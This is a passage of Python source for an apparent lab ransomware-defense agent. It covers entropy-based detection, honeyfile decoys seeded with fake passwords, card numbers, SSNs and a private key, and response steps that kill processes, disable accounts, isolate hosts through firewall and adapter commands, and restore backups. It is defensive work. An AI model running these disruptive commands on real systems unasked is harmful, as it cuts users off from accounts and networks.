                        continue
                    
                    old_entropy = file_baselines.get(filepath_str, 0.0)
                    entropy_jump = new_entropy - old_entropy
                    
                    # Detection rule: low -> high entropy jump
                    if (old_entropy < 3.5 and new_entropy > high_entropy_threshold) or entropy_jump >= entropy_threshold:
                        alert = {
                            "event_type": "POSSIBLE_RANSOMWARE",
                            "timestamp": datetime.utcnow().isoformat(),
                            "file": filepath_str,
                            "old_entropy": round(old_entropy, 2),
                            "new_entropy": round(new_entropy, 2),
                            "entropy_jump": round(entropy_jump, 2),
                            "mitre_technique": "T1486"
                        }
                        alerts_generated.append(alert)
                        
                        self.logger.warning(
                            f"[ENTROPY MONITOR] ALERT: POSSIBLE_RANSOMWARE detected! "
                            f"file=\"{filepath_str}\" old={old_entropy:.2f} new={new_entropy:.2f} jump={entropy_jump:.2f}"
                        )
                        
                        # Report to backend
                        self._report_sensor_alert(run_id, alert)
                    
                    # Update baseline
                    file_baselines[filepath_str] = new_entropy
            
            time.sleep(scan_interval)
        
        self.logger.info(f"[ENTROPY MONITOR] Completed {scan_count} scans, {len(alerts_generated)} alerts generated")
        
        return (True, json.dumps({
            "status": "completed",
            "scans": scan_count,
            "files_monitored": len(file_baselines),
            "alerts_generated": len(alerts_generated),
            "alerts": alerts_generated
        }))
    
    def start_honeyfile_monitor(self, parameters: dict) -> tuple:
        """
        Start honeyfile deception monitor.
        
        Monitors decoy files that should never be accessed by legitimate users.
        Any access indicates potential malicious activity.
        
        Parameters:
            honeyfiles: List of honeyfile paths to monitor
            create_honeyfiles: Whether to create honeyfiles if they don't exist
            duration: How long to monitor in seconds (default: 300)
            run_id: Associated run ID for reporting
        """
        default_honeyfiles = [
            os.path.join(TEST_DIR, "passwords.txt"),
            os.path.join(TEST_DIR, "credit_cards.csv"),
            os.path.join(TEST_DIR, "Employee_SSNs.txt"),
            os.path.join(TEST_DIR, "bank_accounts.xlsx"),
            os.path.join(TEST_DIR, "private_keys.pem"),
        ]
        
        honeyfiles = parameters.get("honeyfiles", default_honeyfiles)
        create_honeyfiles = parameters.get("create_honeyfiles", True)
        duration = parameters.get("duration", 300)
        run_id = parameters.get("run_id")
        
        self.logger.info(f"[HONEYFILE MONITOR] Starting deception-based detection")
        self.logger.info(f"[HONEYFILE MONITOR] Monitoring {len(honeyfiles)} honeyfiles")
        
        # Create honeyfiles if requested
        if create_honeyfiles:
            self._create_honeyfiles(honeyfiles)
        
        # Record initial state (modification times)
        file_states = {}
        for hf in honeyfiles:
            if os.path.exists(hf):
                stat = os.stat(hf)
                file_states[hf] = {
                    "mtime": stat.st_mtime,
                    "size": stat.st_size,
                    "exists": True
                }
            else:
                file_states[hf] = {"exists": False}
        
        alerts_generated = []
        start_time = time.time()
        scan_count = 0
        
        # Monitor loop
        while time.time() - start_time < duration:
            scan_count += 1
            
            for hf in honeyfiles:
                old_state = file_states.get(hf, {"exists": False})
                
                if os.path.exists(hf):
                    stat = os.stat(hf)
                    new_state = {
                        "mtime": stat.st_mtime,
                        "size": stat.st_size,
                        "exists": True
                    }
                    
                    # Check if file was modified
                    if old_state.get("exists") and (
                        new_state["mtime"] != old_state.get("mtime") or
                        new_state["size"] != old_state.get("size")
                    ):
                        alert = {
                            "event_type": "HONEYFILE_TOUCHED",
                            "timestamp": datetime.utcnow().isoformat(),
                            "file": hf,
                            "old_size": old_state.get("size"),
                            "new_size": new_state["size"],
                            "mitre_technique": "T1083"
                        }
                        alerts_generated.append(alert)
                        
                        self.logger.warning(
                            f"[HONEYFILE MONITOR] ALERT: HONEYFILE_TOUCHED file=\"{hf}\""
                        )
                        
                        self._report_sensor_alert(run_id, alert)
                    
                    file_states[hf] = new_state
                    
                else:
                    # File was deleted
                    if old_state.get("exists"):
                        alert = {
                            "event_type": "HONEYFILE_DELETED",
                            "timestamp": datetime.utcnow().isoformat(),
                            "file": hf,
                            "mitre_technique": "T1485"
                        }
                        alerts_generated.append(alert)
                        
                        self.logger.warning(
                            f"[HONEYFILE MONITOR] ALERT: HONEYFILE_DELETED file=\"{hf}\""
                        )
                        
                        self._report_sensor_alert(run_id, alert)
                    
                    file_states[hf] = {"exists": False}
            
            time.sleep(2)  # Check every 2 seconds
        
        self.logger.info(f"[HONEYFILE MONITOR] Completed {scan_count} scans, {len(alerts_generated)} alerts generated")
        
        return (True, json.dumps({
            "status": "completed",
            "scans": scan_count,
            "honeyfiles_monitored": len(honeyfiles),
            "alerts_generated": len(alerts_generated),
            "alerts": alerts_generated
        }))
    
    def _create_honeyfiles(self, honeyfiles: list):
        """Create honeyfile decoys with realistic-looking fake content."""
        honeyfile_contents = {
            "passwords.txt": """# Corporate Password List - CONFIDENTIAL
admin:P@ssw0rd123!
root:SuperSecret2024
backup_svc:Backup#2024$
sql_admin:SqlServer@dm1n
domain_admin:D0ma1nAdm1n!
""",
            "credit_cards.csv": """card_holder,card_number,expiry,cvv
John Smith,4532-1234-5678-9012,12/25,123
Jane Doe,5412-7534-2341-8890,06/26,456
Bob Wilson,3782-822463-10005,09/24,7890
Alice Brown,6011-1234-5678-9012,03/25,321
""",
            "Employee_SSNs.txt": """# Employee SSN Database - RESTRICTED
EMP001: John Smith - 123-45-6789
EMP002: Jane Doe - 234-56-7890
EMP003: Bob Wilson - 345-67-8901
EMP004: Alice Brown - 456-78-9012
EMP005: Charlie Davis - 567-89-0123
""",
            "bank_accounts.xlsx": """This is a fake Excel file for honeyfile detection.
Account data would be here in a real scenario.
DO NOT USE - DECOY FILE
""",
            "private_keys.pem": """-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyf8MFAKE_KEY_DO_NOT_USE
THIS_IS_A_HONEYPOT_FILE_FOR_DETECTION_PURPOSES_ONLY
-----END RSA PRIVATE KEY-----
"""
        }
        
        for hf in honeyfiles:
            if not os.path.exists(hf):
                try:
                    os.makedirs(os.path.dirname(hf), exist_ok=True)
                    filename = os.path.basename(hf)
                    content = honeyfile_contents.get(filename, f"HONEYPOT FILE - {filename}\nDO NOT ACCESS")
                    with open(hf, 'w') as f:
                        f.write(content)
                    self.logger.info(f"[HONEYFILE MONITOR] Created honeyfile: {hf}")
                except Exception as e:
                    self.logger.warning(f"[HONEYFILE MONITOR] Failed to create honeyfile {hf}: {e}")
    
    def _report_sensor_alert(self, run_id: Optional[int], alert: dict):
        """Report sensor alert to backend."""
        if not run_id:
            return
        
        try:
            payload = {
                "run_id": run_id,
                "agent_id": self.agent_id,
                "alert_type": alert.get("event_type"),
                "timestamp": alert.get("timestamp"),
                "details": alert,
                "severity": 80 if alert.get("event_type") == "POSSIBLE_RANSOMWARE" else 60,
                "mitre_technique": alert.get("mitre_technique")
            }
            
            response = requests.post(
                f"{self.backend_url}/api/siem/agent/sensor-alert",
                json=payload,
                timeout=10
            )
            
            if response.status_code == 200:
                self.logger.debug(f"[SENSOR] Alert reported to backend")
            else:
                self.logger.warning(f"[SENSOR] Alert report failed: {response.status_code}")
                
        except Exception as e:
            self.logger.warning(f"[SENSOR] Failed to report alert: {e}")
    
    def run_detection_sensors(self, parameters: dict) -> tuple:
        """
        Run both entropy and honeyfile sensors concurrently.
        
        This is the main entry point for Blue Team detection capabilities.
        
        Parameters:
            watch_dirs: Directories to monitor for entropy changes
            honeyfiles: Honeyfile paths to monitor
            duration: Monitoring duration in seconds
            run_id: Associated run ID
        """
        import threading
        
        run_id = parameters.get("run_id")
        duration = parameters.get("duration", 300)
        
        self.logger.info(f"[SENSORS] Starting ransomware detection sensors for {duration}s")
        
        results = {"entropy": None, "honeyfile": None}
        
        def run_entropy():
            results["entropy"] = self.start_entropy_monitor({
                "watch_dirs": parameters.get("watch_dirs", [TEST_DIR]),
                "duration": duration,
                "run_id": run_id
            })
        
        def run_honeyfile():
            results["honeyfile"] = self.start_honeyfile_monitor({
                "honeyfiles": parameters.get("honeyfiles"),
                "duration": duration,
                "run_id": run_id
            })
        
        # Start both monitors in parallel
        entropy_thread = threading.Thread(target=run_entropy)
        honeyfile_thread = threading.Thread(target=run_honeyfile)
        
        entropy_thread.start()
        honeyfile_thread.start()
        
        entropy_thread.join()
        honeyfile_thread.join()
        
        self.logger.info(f"[SENSORS] Detection sensors completed")
        
        return (True, json.dumps({
            "status": "completed",
            "entropy_monitor": json.loads(results["entropy"][1]) if results["entropy"] else None,
            "honeyfile_monitor": json.loads(results["honeyfile"][1]) if results["honeyfile"] else None
        }))
    
    # =========================================================================
    # RESPONSE ACTIONS
    # =========================================================================
    
    def response_kill_process(self, parameters: dict) -> tuple:
        """Kill a specified process."""
        process_name = parameters.get("process_name")
        
        if not process_name:
            return (False, "No process_name specified")
        
        self.logger.info(f"Killing process: {process_name}")
        
        try:
            result = subprocess.run(
                ["taskkill", "/F", "/IM", process_name],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                msg = f"Successfully killed process: {process_name}"
                self.logger.info(msg)
                return (True, msg)
            else:
                msg = f"taskkill output: {result.stdout or result.stderr}"
                self.logger.warning(msg)
                # Still return success if process wasn't found (already dead)
                if "not found" in msg.lower() or "could not be found" in msg.lower():
                    return (True, f"Process {process_name} not running")
                return (False, msg)
                
        except subprocess.TimeoutExpired:
            return (False, "taskkill timed out")
        except Exception as e:
            return (False, str(e))
    
    def response_disable_user(self, parameters: dict) -> tuple:
        """Disable a Windows user account."""
        username = parameters.get("username")
        
        if not username:
            return (False, "No username specified")
        
        self.logger.info(f"Disabling user: {username}")
        
        try:
            result = subprocess.run(
                ["net", "user", username, "/active:no"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                msg = f"Successfully disabled user: {username}"
                self.logger.info(msg)
                return (True, msg)
            else:
                msg = f"net user output: {result.stdout or result.stderr}"
                self.logger.warning(msg)
                return (False, msg)
                
        except subprocess.TimeoutExpired:
            return (False, "net user timed out")
        except Exception as e:
            return (False, str(e))
    
    def response_isolate_host(self, parameters: dict) -> tuple:
        """
        Isolate the host based on the specified policy.
        
        Policies:
        - FIREWALL_BLOCK: Block all outbound traffic via Windows Firewall
        - DISABLE_NIC: Disable network adapter(s)
        - HYBRID: Both firewall block and disable secondary NICs
        """
        policy = parameters.get("policy", "FIREWALL_BLOCK")
        adapter_name = parameters.get("adapter_name")
        
        self.logger.warning(f"ISOLATING HOST - Policy: {policy}")
        
        results = []
        success = True
        
        try:
            if policy in ["FIREWALL_BLOCK", "HYBRID"]:
                fw_success, fw_msg = self._apply_firewall_isolation()
                results.append(fw_msg)
                if not fw_success:
                    success = False
            
            if policy in ["DISABLE_NIC", "HYBRID"]:
                nic_success, nic_msg = self._disable_network_adapter(adapter_name)
                results.append(nic_msg)
                if not nic_success:
                    success = False
            
            msg = "; ".join(results)
            self.logger.warning(f"Isolation result: {msg}")
            return (success, msg)
            
        except Exception as e:
            self.logger.exception("Isolation error")
            return (False, str(e))
    
    def response_reisolate_host(self, parameters: dict) -> tuple:
        """
        Re-isolate the host by cleaning up old isolation and re-applying.
        Used when isolation may have failed or been partially restored.
        """
        policy = parameters.get("policy", "FIREWALL_BLOCK")
        adapter_name = parameters.get("adapter_name")
        
        self.logger.warning(f"RE-ISOLATING HOST - Policy: {policy}")
        
        results = []
        success = True
        
        try:
            # First, clean up any existing isolation rules
            self.logger.info("Cleaning up existing isolation rules...")
            self._remove_firewall_isolation()
            
            # Re-apply isolation
            if policy in ["FIREWALL_BLOCK", "HYBRID"]:
                fw_success, fw_msg = self._apply_firewall_isolation()
                results.append(f"[RE-ISOLATION] {fw_msg}")
                if not fw_success:
                    success = False
            
            if policy in ["DISABLE_NIC", "HYBRID"]:
                nic_success, nic_msg = self._disable_network_adapter(adapter_name)
                results.append(f"[RE-ISOLATION] {nic_msg}")
                if not nic_success:
                    success = False
            
            msg = "; ".join(results)
            self.logger.warning(f"Re-isolation result: {msg}")
            return (success, msg)
            
        except Exception as e:
            self.logger.exception("Re-isolation error")
            return (False, str(e))
    
    def response_deisolate_host(self, parameters: dict) -> tuple:
        """
        De-isolate the host, restoring normal network connectivity.
        Removes firewall rules and/or re-enables network adapters.
        """
        policy = parameters.get("policy", "FIREWALL_BLOCK")
        adapter_name = parameters.get("adapter_name")
        
        self.logger.info(f"DE-ISOLATING HOST - Policy: {policy}")
        
        results = []
        success = True
        
        try:
            if policy in ["FIREWALL_BLOCK", "HYBRID"]:
                fw_success, fw_msg = self._remove_firewall_isolation()
                results.append(fw_msg)
                if not fw_success:
                    success = False
            
            if policy in ["DISABLE_NIC", "HYBRID"]:
                nic_success, nic_msg = self._enable_network_adapter(adapter_name)
                results.append(nic_msg)
                if not nic_success:
                    success = False
            
            msg = "; ".join(results)
            self.logger.info(f"De-isolation result: {msg}")
            return (success, msg)
            
        except Exception as e:
            self.logger.exception("De-isolation error")
            return (False, str(e))
    
    def _apply_firewall_isolation(self) -> tuple:
        """Apply firewall rules to block outbound traffic."""
        rule_name_out = "RANSOMRUN_ISOLATION_OUT"
        rule_name_in = "RANSOMRUN_ISOLATION_IN"
        
        try:
            # Ensure firewall is enabled
            subprocess.run(
                ["netsh", "advfirewall", "set", "allprofiles", "state", "on"],
                capture_output=True,
                timeout=30
            )
            
            # Remove any existing rules first
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name_out}"],
                capture_output=True,
                timeout=30
            )
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name_in}"],
                capture_output=True,
                timeout=30
            )
            
            # Add rule to block all outbound traffic
            result_out = subprocess.run(
                [
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={rule_name_out}",
                    "dir=out",
                    "action=block",
                    "protocol=any",
                    "enable=yes"
                ],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Add rule to block all inbound traffic (except established)
            result_in = subprocess.run(
                [
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    f"name={rule_name_in}",
                    "dir=in",
                    "action=block",
                    "protocol=any",
                    "enable=yes"
                ],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result_out.returncode == 0 and result_in.returncode == 0:
                return (True, "Firewall isolation applied (inbound + outbound blocked)")
            else:
                errors = []
                if result_out.returncode != 0:
                    errors.append(f"Outbound: {result_out.stderr or result_out.stdout}")
                if result_in.returncode != 0:
                    errors.append(f"Inbound: {result_in.stderr or result_in.stdout}")
                return (False, f"Firewall errors: {'; '.join(errors)}")
                
        except subprocess.TimeoutExpired:
            return (False, "Firewall command timed out")
        except Exception as e:
            return (False, f"Firewall error: {e}")
    
    def _remove_firewall_isolation(self) -> tuple:
        """Remove firewall isolation rules."""
        rule_name_out = "RANSOMRUN_ISOLATION_OUT"
        rule_name_in = "RANSOMRUN_ISOLATION_IN"
        
        try:
            result_out = subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name_out}"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            result_in = subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name_in}"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            # Also try to remove legacy rule name
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", "name=RANSOMRUN_ISOLATION"],
                capture_output=True,
                timeout=30
            )
            
            return (True, "Firewall isolation rules removed")
            
        except subprocess.TimeoutExpired:
            return (False, "Firewall command timed out")
        except Exception as e:
            return (False, f"Firewall removal error: {e}")
    
    def _disable_network_adapter(self, adapter_name: Optional[str] = None) -> tuple:
        """Disable network adapter(s) using PowerShell."""
        try:
            if adapter_name:
                # Disable specific adapter
                cmd = f'Disable-NetAdapter -Name "{adapter_name}" -Confirm:$false'
            else:
                # Get and disable all active adapters (risky - may lose connectivity)
                # For safety, we'll just disable non-primary adapters
                cmd = 'Get-NetAdapter | Where-Object { $_.Status -eq "Up" -and $_.InterfaceDescription -notlike "*Virtual*" } | Select-Object -Skip 1 | Disable-NetAdapter -Confirm:$false'
            
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                return (True, f"Network adapter(s) disabled: {adapter_name or 'secondary adapters'}")
            else:
                # May fail if no adapters match or already disabled
                return (True, f"NIC disable attempted: {result.stderr or 'no matching adapters'}")
                
        except subprocess.TimeoutExpired:
            return (False, "PowerShell command timed out")
        except Exception as e:
            return (False, f"NIC disable error: {e}")
    
    def _enable_network_adapter(self, adapter_name: Optional[str] = None) -> tuple:
        """Re-enable network adapter(s) using PowerShell."""
        try:
            if adapter_name:
                cmd = f'Enable-NetAdapter -Name "{adapter_name}" -Confirm:$false'
            else:
                # Enable all disabled adapters
                cmd = 'Get-NetAdapter | Where-Object { $_.Status -eq "Disabled" } | Enable-NetAdapter -Confirm:$false'
            
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode == 0:
                return (True, f"Network adapter(s) enabled: {adapter_name or 'all disabled adapters'}")
            else:
                return (True, f"NIC enable attempted: {result.stderr or 'no matching adapters'}")
                
        except subprocess.TimeoutExpired:
            return (False, "PowerShell command timed out")
        except Exception as e:
            return (False, f"NIC enable error: {e}")
    
    # =========================================================================
    # RECOVERY ACTIONS
    # =========================================================================
    
    def recovery_enable_user(self, parameters: dict) -> tuple:
        """Re-enable a Windows user account that was disabled during containment."""
        username = parameters.get("username")
        
        if not username:
            return (False, "No username specified")
        
        self.logger.info(f"Re-enabling user: {username}")
        
        try:
            result = subprocess.run(
                ["net", "user", username, "/active:yes"],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                msg = f"Successfully re-enabled user: {username}"
                self.logger.info(msg)
                return (True, msg)
            else:
                msg = f"net user output: {result.stdout or result.stderr}"
                self.logger.warning(msg)
                # Check if user doesn't exist
                if "not found" in msg.lower():
                    return (True, f"User {username} not found (may not exist)")
                return (False, msg)
                
        except subprocess.TimeoutExpired:
            return (False, "net user timed out")
        except Exception as e:
            return (False, str(e))
    
    def recovery_restore_files_from_quarantine(self, parameters: dict) -> tuple:
        """
        Restore files from quarantine directory to a target location.
        
        Parameters:
        - quarantine_dir: Source directory where quarantined files are stored
        - restore_target_dir: Destination directory for restored files
        """
        quarantine_dir = parameters.get("quarantine_dir", QUARANTINE_DIR)
        restore_target_dir = parameters.get("restore_target_dir", TEST_DIR)
        
        self.logger.info(f"Restoring files from {quarantine_dir} to {restore_target_dir}")
        
        try:
            quarantine_path = Path(quarantine_dir)
            restore_path = Path(restore_target_dir)
            
            if not quarantine_path.exists():
                return (True, f"Quarantine directory does not exist: {quarantine_dir}")
            
            # Create restore directory if it doesn't exist
            restore_path.mkdir(parents=True, exist_ok=True)
            
            restored_count = 0
            errors = []
            
            for filepath in quarantine_path.iterdir():
                if filepath.is_file():
                    try:
                        dest = restore_path / filepath.name
                        shutil.move(str(filepath), str(dest))
                        restored_count += 1
                        self.logger.info(f"Restored: {filepath.name}")
                    except Exception as e:
                        errors.append(f"{filepath.name}: {e}")
            
            if errors:
                msg = f"Restored {restored_count} files with {len(errors)} errors: {'; '.join(errors[:3])}"
            else:
                msg = f"Successfully restored {restored_count} files from quarantine"
            
            self.logger.info(msg)
            return (True, msg)
            
        except Exception as e:
            self.logger.exception("File restore error")
            return (False, str(e))
    
    # =========================================================================
    # NEW PLAYBOOK ACTION HANDLERS
    # =========================================================================
    
    def backup_snapshot(self, parameters: dict) -> tuple:
        """Create a backup snapshot of critical files."""
        snapshot_type = parameters.get("snapshot_type", "FILE_LEVEL")
        backup_paths = parameters.get("backup_paths", [TEST_DIR])
        
        self.logger.info(f"Creating {snapshot_type} backup snapshot")
        
        try:
            import hashlib
            from datetime import datetime
            
            # Create backup directory
            backup_dir = Path("backups") / f"snapshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            backup_dir.mkdir(parents=True, exist_ok=True)
            
            files_backed_up = 0
            total_size = 0
            manifest = []
            
            for backup_path in backup_paths:
                path = Path(backup_path)
                if not path.exists():
                    continue
                
                for file_path in path.rglob("*"):
                    if file_path.is_file():
                        try:
                            # Calculate hash
                            with open(file_path, "rb") as f:
                                file_hash = hashlib.sha256(f.read()).hexdigest()
                            
                            # Copy to backup
                            rel_path = file_path.relative_to(path)
                            dest = backup_dir / rel_path
                            dest.parent.mkdir(parents=True, exist_ok=True)
                            shutil.copy2(file_path, dest)
                            
                            file_size = file_path.stat().st_size
                            files_backed_up += 1
                            total_size += file_size
                            
                            manifest.append({
                                "original_path": str(file_path),
                                "backup_path": str(dest),
                                "size": file_size,
                                "hash": file_hash
                            })
                            
                        except Exception as e:
                            self.logger.warning(f"Failed to backup {file_path}: {e}")
            
            # Save manifest
            manifest_file = backup_dir / "manifest.json"
            with open(manifest_file, "w") as f:
                json.dump(manifest, f, indent=2)
            
            msg = f"Backup complete: {files_backed_up} files, {total_size} bytes to {backup_dir}"
            self.logger.info(msg)
            return (True, msg)
            
        except Exception as e:
            self.logger.exception("Backup snapshot error")
            return (False, str(e))
    
    def restore_backup(self, parameters: dict) -> tuple:
        """Restore files from a backup snapshot."""
        snapshot_id = parameters.get("snapshot_id")
        restore_type = parameters.get("restore_type", "FULL")
        target_path = parameters.get("target_path")
        
        self.logger.info(f"Restoring backup snapshot {snapshot_id} (type: {restore_type})")
        
        try:
            # Find latest backup if no snapshot_id specified
            backup_base = Path("backups")
            if not backup_base.exists():
                return (False, "No backups directory found")
            
            snapshots = sorted(backup_base.glob("snapshot_*"), reverse=True)
            if not snapshots:
                return (False, "No backup snapshots found")
            
            snapshot_dir = snapshots[0]
            manifest_file = snapshot_dir / "manifest.json"
            
            if not manifest_file.exists():
                return (False, "Backup manifest not found")
            
            with open(manifest_file, "r") as f:
                manifest = json.load(f)
            
            files_restored = 0
            for item in manifest:
                try:
                    backup_path = Path(item["backup_path"])
                    original_path = Path(item["original_path"])
                    
                    if target_path:
                        # Restore to alternate location
                        dest = Path(target_path) / original_path.name
                    else:
                        # Restore to original location
                        dest = original_path
                    
                    dest.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(backup_path, dest)
                    files_restored += 1
                    
                except Exception as e:
                    self.logger.warning(f"Failed to restore {item['original_path']}: {e}")
            
            msg = f"Restore complete: {files_restored}/{len(manifest)} files restored from {snapshot_dir.name}"
            self.logger.info(msg)
            return (True, msg)
            
        except Exception as e:
            self.logger.exception("Restore backup error")
            return (False, str(e))
    
    def isolate_host(self, parameters: dict) -> tuple:
        """Isolate host using specified policy."""
        policy = parameters.get("policy", "HYBRID")
        ttl_minutes = parameters.get("ttl_minutes")
        
        self.logger.info(f"Isolating host with policy: {policy}, TTL: {ttl_minutes} min")
        
        # Reuse existing isolation logic
        return self.response_isolate_host(parameters)
    
    def deisolate_host(self, parameters: dict) -> tuple:
        """Remove host isolation."""
        self.logger.info("De-isolating host (escape hatch)")
        
        # Reuse existing de-isolation logic
        return self.response_deisolate_host(parameters)
    
    def protect_backup_targets(self, parameters: dict) -> tuple:
        """Protect backup directories from modification."""
        backup_paths = parameters.get("backup_paths", ["C:\\Backups"])
        
        self.logger.info(f"Protecting backup targets: {backup_paths}")
        
        try:
            protected = []
            for path in backup_paths:
                backup_path = Path(path)
                if backup_path.exists():
                    # Set read-only attribute (simulation)
                    try:
                        subprocess.run(
                            ["attrib", "+R", str(backup_path), "/S", "/D"],
                            capture_output=True,
                            timeout=30
                        )
                        protected.append(str(backup_path))
                    except Exception as e:
                        self.logger.warning(f"Failed to protect {path}: {e}")
            
            msg = f"Protected {len(protected)} backup directories"
            self.logger.info(msg)
            return (True, msg)
            
        except Exception as e:
            self.logger.exception("Protect backup targets error")
            return (False, str(e))
    
    def collect_triage(self, parameters: dict) -> tuple:
        """Collect forensic triage data."""
        triage_type = parameters.get("triage_type", "ransomware_full")
        
        self.logger.info(f"Collecting triage data: {triage_type}")
        
        try:
            from datetime import datetime
            
            triage_dir = Path("triage") / f"triage_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            triage_dir.mkdir(parents=True, exist_ok=True)
            
            collected = []
            
            # Collect running processes
            try:
                result = subprocess.run(
                    ["tasklist", "/V", "/FO", "CSV"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                with open(triage_dir / "processes.csv", "w") as f:
                    f.write(result.stdout)
                collected.append("processes")
            except:
                pass
            
            # Collect network connections
            try:
                result = subprocess.run(
                    ["netstat", "-ano"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                with open(triage_dir / "network.txt", "w") as f:
                    f.write(result.stdout)
                collected.append("network")
            except:
                pass
            
            # Collect autoruns (registry run keys)
            try:
                result = subprocess.run(
                    ["reg", "query", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                with open(triage_dir / "autoruns.txt", "w") as f:
                    f.write(result.stdout)
                collected.append("autoruns")
            except:
                pass
            
            # Collect recent file modifications
            if triage_type == "file_system":
                try:
                    recent_files = []
                    for path in [TEST_DIR]:
                        p = Path(path)
                        if p.exists():
                            for f in p.rglob("*"):
                                if f.is_file():
                                    recent_files.append({
                                        "path": str(f),
                                        "size": f.stat().st_size,
                                        "modified": f.stat().st_mtime
                                    })
                    
                    with open(triage_dir / "recent_files.json", "w") as f:
                        json.dump(recent_files, f, indent=2)
                    collected.append("file_system")
                except:
                    pass
            
            msg = f"Triage collection complete: {', '.join(collected)} -> {triage_dir}"
            self.logger.info(msg)
            return (True, msg)
            
        except Exception as e:
            self.logger.exception("Collect triage error")
            return (False, str(e))
    
    def block_ip(self, parameters: dict) -> tuple:
        """Block IP address using firewall."""
        ip_address = parameters.get("ip_address", "auto_detect")
        direction = parameters.get("direction", "outbound")
        port = parameters.get("port")
        
        self.logger.info(f"Blocking IP: {ip_address}, direction: {direction}")
        
        try:
            if ip_address == "auto_detect":
                # In real scenario, would detect C2 IP from network traffic
                ip_address = "203.0.113.0"  # TEST-NET-3 (documentation range)
            
            rule_name = f"RANSOMRUN_BLOCK_{ip_address.replace('.', '_')}"
            
            # Remove existing rule
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule", f"name={rule_name}"],
                capture_output=True,
                timeout=30
            )
            
            # Add blocking rule
            cmd = [
                "netsh", "advfirewall", "firewall", "add", "rule",
                f"name={rule_name}",
                f"dir={direction}",
                "action=block",
                f"remoteip={ip_address}",
                "enable=yes"
            ]
            
            if port:
                cmd.extend([f"protocol=TCP", f"remoteport={port}"])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                msg = f"Blocked {direction} traffic to {ip_address}"
                if port:
                    msg += f" on port {port}"
                self.logger.info(msg)
                return (True, msg)
            else:
                return (False, f"Firewall rule failed: {result.stderr or result.stdout}")
                
        except Exception as e:
            self.logger.exception("Block IP error")
            return (False, str(e))
    
    # =========================================================================
    # AUTOROLLBACK TASK HANDLERS
    # =========================================================================
    
    # Default safe paths for rollback (lab directories only)
    ROLLBACK_SAFE_PATHS = [
        r"C:\RansomTest",
        r"C:\RansomLab",
        r"C:\Users\Public\Documents",
    ]
    
    # Blocked paths (system directories - NEVER modify)
    ROLLBACK_BLOCKED_PATHS = [
        r"C:\Windows",
        r"C:\Program Files",
        r"C:\Program Files (x86)",
        r"C:\ProgramData",
        r"C:\$Recycle.Bin",
        r"C:\System Volume Information",
    ]
    
    def _is_path_safe_for_rollback(self, path: str, safe_paths: List[str]) -> Tuple[bool, str]:
        """Check if a path is safe to operate on for rollback."""
        if not path:
            return False, "Empty path"
        
        norm_path = os.path.normpath(path).lower()
        
        # Check blocked paths first
        for blocked in self.ROLLBACK_BLOCKED_PATHS:
            if norm_path.startswith(blocked.lower()):
                return False, f"Path is in blocked system directory: {blocked}"
        
        # Check sensitive user paths
        sensitive = ["appdata", "application data", "local settings", "ntuser.dat"]
        for sens in sensitive:
            if sens in norm_path:
                return False, f"Path contains sensitive user directory: {sens}"
        
        # Check if path is under a safe path
        for safe_path in safe_paths:
            safe_norm = os.path.normpath(safe_path).lower()
            if norm_path.startswith(safe_norm):
                return True, "Path is under allowed safe path"
        
        return False, "Path is not under any configured safe path"
    
    def _compute_file_hash(self, filepath: str) -> Optional[str]:
        """Compute SHA256 hash of a file."""
        try:
            import hashlib
            sha256 = hashlib.sha256()
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(8192), b''):
                    sha256.update(chunk)
            return sha256.hexdigest()
        except Exception as e:
            self.logger.error(f"Hash computation failed for {filepath}: {e}")
            return None
    
    def rollback_restore_from_snapshot(self, parameters: dict) -> Tuple[bool, str]:
        """
        Restore files from backup snapshot.
        
        SAFETY CONSTRAINTS:
        - Only operates on configured safe paths (lab directories)
        - System directories are ALWAYS blocked
        - Supports dry_run mode (simulate without changes)
        - Full audit trail with before/after hashes
        
        Parameters:
            plan_id: Rollback plan ID
            dry_run: If True, simulate without making changes
            safe_paths: List of allowed paths
            conflict_policy: QUARANTINE, OVERWRITE, or SKIP
            cleanup_extensions: Extensions to clean up
            restore_actions: List of file actions to perform
            conflict_directory: Where to move conflicting files
        """
        plan_id = parameters.get("plan_id")
        dry_run = parameters.get("dry_run", False)
        safe_paths = parameters.get("safe_paths", self.ROLLBACK_SAFE_PATHS)
        conflict_policy = parameters.get("conflict_policy", "QUARANTINE")
        conflict_dir = parameters.get("conflict_directory", rf"C:\RansomRun\rollback_conflicts\{plan_id}")
        restore_actions = parameters.get("restore_actions", [])
        
        self.logger.info(f"[ROLLBACK] Starting restore for plan {plan_id} (dry_run={dry_run})")
        self.logger.info(f"[ROLLBACK] Safe paths: {safe_paths}")
        self.logger.info(f"[ROLLBACK] Files to process: {len(restore_actions)}")
        
        # Create conflict directory if needed
        if not dry_run and conflict_policy == "QUARANTINE":
